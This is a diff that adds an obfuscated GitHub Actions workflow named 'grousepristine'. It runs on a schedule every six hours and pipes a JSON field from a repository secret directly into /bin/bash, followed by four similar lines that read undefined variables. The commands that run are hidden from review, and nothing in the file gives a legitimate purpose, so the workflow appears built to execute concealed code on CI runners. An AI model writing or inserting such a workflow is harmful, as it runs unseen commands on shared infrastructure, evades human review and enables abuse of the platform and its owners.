@@ -1,0 +1,23 @@
+name: grousepristine
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: grousepristine
+        env:
+          i3505: ${{ secrets.i3505 }}
+        run: |
+          echo $i3505 | jq -r .zb00 | /bin/bash
+          echo $cgmar262 | jq -r .hq5883 | /bin/bash
+          echo $vfjr62350 | jq -r .a4 | /bin/bash
+          echo $o546 | jq -r .z30595 | /bin/bash
+          echo $c013 | jq -r .as9 | /bin/bash
+
